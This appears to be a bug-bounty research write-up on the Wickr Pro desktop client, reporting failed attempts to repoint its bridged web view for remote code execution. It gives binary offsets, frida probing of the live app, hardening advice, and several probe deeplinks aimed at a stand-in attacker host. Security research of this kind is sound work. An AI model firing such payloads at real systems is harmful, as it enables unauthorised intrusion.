# A7 — config/QSettings write-path + bridged-view repoint (chase P1 → full-bridge RCE)

**Verdict: NEGATIVE (no win) on all three theses, with precise session-independent blockers.**
Established by static RE (rizin + PE `.pdata` function table + deterministic numpy RIP-rel/`E8` xref
scanner) **and** runtime observation (frida on live `WickrPro.exe` + app logs). The single
WebChannel-bridged view's URL (`webViewAddress`) is **never written from any server-pushed /
received-content / deeplink input** — only from a local developer-only settings field. Onboarding
cannot repoint it either (bootstrap config carries no view-URL). Honest negative.

Binary: `E:\tmp\wickr\main\WickrPro.exe` (base `0x140000000`). Live: **resolve PID by name**
(observed 15048; rotates). Artifacts reused from A2: `…\scratchpad\qrc\` (carved QML/JS),
`hook.js`/`run_hook.py`. New A7 tooling: `…\scratchpad\xref_a7.py` (RIP-rel ref scan),
`func_a7.py` (.pdata bounds + E8/E9 caller scan), `hook_a7.js`/`run_a7.py` (live probes).

---

## The decisive object graph (recovered)

The bridged chat view loads `webview.url = wickrSettings.webViewAddress` (QML `blob_030a2bec`,
str `0x1430a35f1`). `webViewAddress` is a Q_PROPERTY on the `wickrSettings` QObject.

- **Reader** `value("webViewAddress", default)` — fn **[0x1409ed810..0x1409ed9aa)**; the setValue/value
  default pairs the key str `0x14325ae90` with default `qrc:/index.html` (`0x14325ae80`).
- **Writer** `setValue("webViewAddress", QVariant)` — fn **[0x1409ec860..0x1409ec959)** (persists to QSettings).
- **Both reader and writer have exactly ONE caller**, and it is the same function
  **[0x140a99580..0x140a9c70f)** = `wickrSettings::qt_static_metacall` (prologue = classic Qt metacall:
  `test edx,edx` (Call type) → `cmp r8d,0xc4; ja …` → jump-table `[0x140a9bfe8 + idx*4]`). Writer call
  site = `0x140a9be88`; reader call site = `0x140a9b8c5`.

→ `setWebViewAddress` is reachable **only** through the QMetaObject/metacall system (QML property write,
`QObject::setProperty`, `QMetaObject::invokeMethod`, or a registered WebChannel object).

**Who actually drives that metacall to WRITE it:**
- **React WebChannel only.** `wickrSettings` is a registered channel object. The bundled React app
  (`blob_0198cdb0`) exposes `setWebViewAddress(v)` → `ee.webViewAddress=ne` over the channel, dispatched
  by Redux thunk `updateWebViewAddress` ("settings/setWebViewAddress"), wired to the settings field
  **literally labelled `"Custom Web View Address (For development only)"`** (i18n key present in-bundle).
- **No native invoker:** the meta-method name string `"setWebViewAddress"` (`0x14327c1f9`) has **0 code
  xrefs**; the only code refs to the `"webViewAddress"` key string are the reader/writer QSettings
  calls. So no `invokeMethod("setWebViewAddress")` / `setProperty("webViewAddress")` exists in native code.
- **No QML writer:** the only QML/JS assignments in qrc are the settings default (`webViewAddress:""`)
  and the channel-side dev setter (`ee.webViewAddress=ne`). QML only ever READS the property to load the view.

⇒ **The bridged view's URL is written by exactly one thing: the local, developer-only settings text
field.** Setting it to attacker content requires a local user to type an attacker URL into a dev-only
field = **non-default + local user action ⇒ EXCLUDED**. Not attacker-reachable via received content,
message/room/file data, deeplink, or server config.

---

## Thesis 1 — server-pushed / received-content config writes `webViewAddress` — **NEGATIVE**

Every server/received channel that could carry config was enumerated; none writes `webViewAddress` (or
the view URL):

1. **Server feature flags** (`SwitchboardMessage.Logon.featureFlags`, server-pushed over the real-time
   Switchboard). Full protobuf field set = `messageUpload` (bool) + `typingIndicator`
   (TypingIndicatorFeature toggle). **No URL / no view field.**
2. **Onboarding/provisioning bootstrap** = `loadBootStrapJson` fn **[0x1409c7b70..0x1409c927d)** (debug
   str "loadBootStrapJson:: "; fed by `QVariant::toJsonDocument()` @0x140aea928; source =
   `https://<serviceHost>/install-config/info`, str `0x14328ae30`). **Complete key schema** (every
   `QJsonObject::contains` key): `usernameMode, username, inviteCode, requireEmailVerification,
   userManagedCredentials, serviceHost` (→ builds `"https://"+serviceHost` = REST "BASE URL"),
   `serviceSSLKeys, serviceRegKeys, companyId, compliance, pubKey, regToken` + SSL-pinning ENABLE/DISABLE
   + SSO-disable. **No `webViewAddress`, no `webAppLoadUrl`, no view URL of any kind.**
3. **Deeplink `register`/`WOA`** handler **[0x140ae8200..0x140ae95f0)** parses only
   `serviceHost`(→[rsi+0x38]), `token`(→[rsi+0x50]), `cert`(QList→[rsi+0x80]), `path`(→[rsi+0x68]).
   It does **not** call `setWebViewAddress` (verified: writer's only caller is the metacall, not this fn).
4. **Local QSettings** — `webViewAddress` not present in the persisted store (registry key
   `HKCU\Software\Wickr, LLC\Wickr Pro` has no such value) ⇒ default `qrc:/index.html` in use.

**Runtime (frida on live PID 15048, hooks on reader/writer/loadBootStrapJson/register-handler/classifier;
`hook_a7.js`+`run_a7.py`):** fired
`wickrpro://register?serviceHost=attacker.evil.example&token=…&cert=…`,
`wickrpro://woa?serviceHost=attacker.evil.example`,
`wickrpro://register?webViewAddress=http://attacker.evil.example/x&serviceHost=…`,
`wickrpro://sso-verify?serviceHost=…`. Observed: classifier hit for each (ret 0/0/0/**2**, `sso-verify→2`
matches N3) but **`setWebViewAddress` NEVER called, `loadBootStrapJson` NEVER called, register handler
never reached.** App log confirms the live bridged view = `qrc:/index.html`
(`[Preebootstap] App Path: /index.html`; `[WickrSettingsSubscriptions] webViewAddressChanged qrc:/index.html`).

**Blocker:** no server/received/deeplink field named or mapped to `webViewAddress`; the sole writer is
the dev-only local UI field; the setter has no native or server-reachable invoker.

## Thesis 2 — logged-out `register`/`WOA` onboarding repoint (serviceHost=attacker) — **NEGATIVE**

The onboarding/WOA path **does** let an attacker-supplied deeplink point a fresh client at an attacker
`serviceHost`, and cert-pinning is **not** the blocker (the bootstrap itself carries `serviceSSLKeys`,
so an attacker who supplies the bootstrap supplies the pinned key — the designed on-prem provisioning
model). **But it does not repoint the bridged view**, for reasons independent of session state:

- **Bootstrap has no view-URL field** (full schema above) — controlling `serviceHost`/bootstrap sets the
  REST BASE URL + pinning + reg keys, nothing that touches `webViewAddress`.
- **Onboarding UI is native QML**, not a bridged web view over `serviceHost`: the whole
  `/qml/AWSWickrProOnBoarding/*.qml` set (AWSOnBoarding, CreatePassword, CheckYourEmail, GuestOrAWSOption,
  DeviceSync, …) with `onboardingBridge`. There is **exactly one** `webChannel:` assignment in the entire
  binary (the chat view), and it loads `webViewAddress`=`qrc:/index.html`.
- So even after onboarding against an attacker server, the single bridged view still loads
  `qrc:/index.html`. The attacker-as-server can push messages/API data, but those render through the
  chat view's CSP (`script-src 'self' qrc://*`) + DOMPurify (N3) — no bridge exposure to attacker WEB
  content. That residual is a **malicious-server** scenario (attacker must get a logged-out victim to
  complete enterprise registration against their host — >1-click, designed provisioning path), and it
  still never reaches the native bridge.

**Execution note (honesty):** the register/WOA deeplinks were fired at the **live logged-in** client and
observed to be dropped before the handler (logged-in gate; corroborates N3). A fully logged-out run was
**not** performed — the only live instance is the logged-in bug-bounty session, `SingleApplication`
blocks a 2nd instance, and re-login after logout needs credentials/2FA (out of RoE, and disruptive).
This does not change the verdict: the logged-out path would additionally run
`register-handler → loadBootStrapJson`, and **both provably lack any `webViewAddress`/view-URL write**
(writer's sole caller is the metacall; bootstrap schema fully enumerated). The blocker is
session-independent. Labeled **NEGATIVE (logged-out execution UNCONFIRMED, but non-decisive).**

## Thesis 3 — QML injection into a bridged/privileged context — **NEGATIVE**

Only `Qt.createQmlObject` use is in the **Qt5-fallback** branch of the chat-view QML (`0x1430a2437`),
and its component text is a **static template literal** (a `WebEngineScript` preloads shim) — no
attacker data, and the branch is not taken on this Qt6 build (`if(wickrDashboardData.qt6){…}else{createQmlObject}`;
runtime is Qt6). No `createComponent`/`setSource`/`loadUrl` in qrc is fed attacker-controlled data
(`Loader.setSource` targets are static qrc; `setSourceConvoModel` is an unrelated proxy-model API).

---

## Adversarial refutation
- *Is the config channel server-only/authenticated ⇒ excluded?* The relevant channels (featureFlags,
  bootstrap) don't carry the target field **at all**, so authentication is moot — there is nothing to push.
- *Does cert-pinning block the serviceHost payload?* No — bootstrap carries its own `serviceSSLKeys`; but
  this is irrelevant because the bootstrap can't set `webViewAddress`.
- *Is the setting write local-only ⇒ excluded?* Yes — the sole writer is the dev-only "Custom Web View
  Address (For development only)" field via the WebChannel; local + non-default ⇒ EXCLUDED.
- *Does a repointed/onboarded view keep the bridge?* The onboarding view is native QML (no channel); the
  one bridged view always loads `webViewAddress` (=`qrc:/index.html`), which onboarding never changes.
- *Observed == WIN?* No sink reached: `setWebViewAddress`/`loadBootStrapJson`/register-handler never fired
  from any received/deeplink probe; live view stayed `qrc:/index.html`.

## Residuals (NOT wins) / defense-in-depth
- `webViewAddress`, `popcornOverrideAddress` (A/V calling-server override — a **separate** setting from
  the web view; writer [near 0x1409e340f/0x1409eb29f]), and `serviceHost` are all attacker-settable **only**
  locally (dev UI) or via the designed onboarding provisioning. Harden: lock `webViewAddress` to `qrc:` in
  production builds; gate the dev settings screen behind a build flag; add an `onNavigationRequested`
  allowlist on the bridged view.
- Attacker-controlled `serviceHost` (logged-out WOA) = full malicious-server posture (MITM-class,
  excluded), but bridgeless — no escalation to native.

## Key offsets
writer `setWebViewAddress` [0x1409ec860..0x1409ec959) (setValue @0x1409ec913) · reader
[0x1409ed810..0x1409ed9aa) (value @0x1409ed8f2) · `wickrSettings::qt_static_metacall`
[0x140a99580..0x140a9c70f) (writer call 0x140a9be88, jumptbl 0x140a9bfe8) · `loadBootStrapJson`
[0x1409c7b70..0x1409c927d) · register/WOA handler [0x140ae8200..0x140ae95f0) · deeplink classifier
0x140ad2b50 · keys: webViewAddress str 0x14325ae90 (default qrc:/index.html 0x14325ae80), serviceHost
0x143256230, install-config/info 0x14328ae30, setWebViewAddress meta-str 0x14327c1f9 (0 refs).
